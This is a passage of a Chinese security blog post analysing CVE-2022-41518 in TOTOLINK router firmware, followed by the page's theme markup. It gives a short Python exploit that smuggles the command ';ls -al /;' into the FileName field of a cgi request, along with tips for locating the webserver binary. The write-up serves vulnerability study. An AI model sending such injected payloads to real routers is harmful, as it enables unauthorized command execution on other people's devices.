+<h3 id="CVE-2022-41518"><a href="#CVE-2022-41518" class="headerlink" title="CVE-2022-41518"></a>CVE-2022-41518</h3><p>与上个<code>cve</code>相似,也是一处命令拼接无检查导致<code>RCE</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0044</span>C188 aUploadfirmware:.ascii <span class="string">&quot;UploadFirmwareFile&quot;</span>&lt;<span class="number">0</span>&gt;</span><br><span class="line">.data:<span class="number">0044</span>C19B                 .byte <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C19C                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1A0                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1A4                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1A8                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1AC                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1B0                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1B4                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1B8                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1BC                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1C0                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1C4                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C1C8                 .word sub_42D3B4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/TOTOLINK/1753756045806.png" alt="1753756045806"></p>
+<p>没有任何检查,把上个<code>EXP</code>改改就能用</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.52.134/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;SESSION_ID=2:1753752248:2&quot;</span>&#125;</span><br><span class="line">Host = <span class="string">&quot;192.168.52.134&quot;</span><span class="comment">#http://192.168.52.134</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;topicurl&quot;</span> : <span class="string">&quot;UploadFirmwareFile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FileName&quot;</span> : <span class="string">&quot;;ls -al /;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, json=data, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/TOTOLINK/1753756147528.png" alt="1753756147528"></p>
+<h2 id="4-后记–如何快速定位webserver文件"><a href="#4-后记–如何快速定位webserver文件" class="headerlink" title="| 4 | 后记–如何快速定位webserver文件"></a>| 4 | 后记–如何快速定位webserver文件</h2><h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a><em>启动脚本</em></h3><p>一般&#x2F;etc&#x2F;rc.d中S开头的启动脚本脚本,会按S后数字顺序执行的</p>
+<p>可以在脚本中找到启动的web服务文件</p>
+<h3 id="通过表单搜索"><a href="#通过表单搜索" class="headerlink" title="通过表单搜索"></a>通过表单搜索</h3><p>我们知道客户端请求会由<code>webserver</code>传递给<code>cgi</code>处理</p>
+<p>那我们就可以先在<code>www</code>目录下寻找任意提交表单</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; ref=&quot;loginfrm&quot; @keyup.enter.prevent @keydown.enter.prevent&gt;</span><br><span class="line">var i=&quot;/cgi-bin/cstecgi.cgi?action=login&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们就定位到了后端处理程序<code>cgi</code></p>
+<p><code>cgi</code>是由<code>httpd</code>在<code>fork</code>后<code>exec</code>调用的,所有<code>httpd</code>中有着对<code>cgi文件</code>的引用</p>
+<p>我们在文件系统根目录中搜索所有对<code>cgi文件</code>的引用,一般就可以找到<code>webserver文件</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;cstecgi.cgi&quot; .</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot/" rel="tag">iot</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="CVE-2005-2799" class="lazyload">
+        
+      
+      <a href="/2025/07/14/CVE-2005-2799%20linksys%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CVE-2005-2799
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        43k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:10
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TOTOLINK%E2%80%93webserver%E4%B8%8Ecgi"><span class="toc-number">1.</span> <span class="toc-text">TOTOLINK–webserver与cgi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | web基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">| 1 | 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">| 2 | 登录密码绕过流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-41525"><span class="toc-number">1.5.1.</span> <span class="toc-text">CVE-2022-41525</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-41518"><span class="toc-number">1.5.2.</span> <span class="toc-text">CVE-2022-41518</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%90%8E%E8%AE%B0%E2%80%93%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8Dwebserver%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.</span> <span class="toc-text">| 4 | 后记–如何快速定位webserver文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%A1%A8%E5%8D%95%E6%90%9C%E7%B4%A2"><span class="toc-number">1.6.2.</span> <span class="toc-text">通过表单搜索</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "totolink",
+          url: "https://khighl.github.io.git/2025/07/29/TOTOLINK/",
+          excerpt: "",
+          description: "",
+          stripContent: "TOTOLINK–webserver与cgi| 0 | 前言经过了nepctf的洗礼,感觉自己找回了对二进制安全的热爱 依旧不会web,依旧被拷打…不过已经开始补web的知识了 | 1 | web基础知识固件包中,常见的二进制文件包括httpd&amp;#x2F;xxx(.cgi) httpd用于  维护webserver,监听端口,等待客户端发发送的请求 显示静态页面(资源) 调用后端程序(cgi,php)处理请求 处理HTTP协议细节,如重定向、状态码、缓存控制  cgi用于请求处理的具体实现 ht",
+          date: "Tue Jul 29 2025 00:00:00 GMT+0800",
+          updated: "Tue Jul 29 2025 11:15:05 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
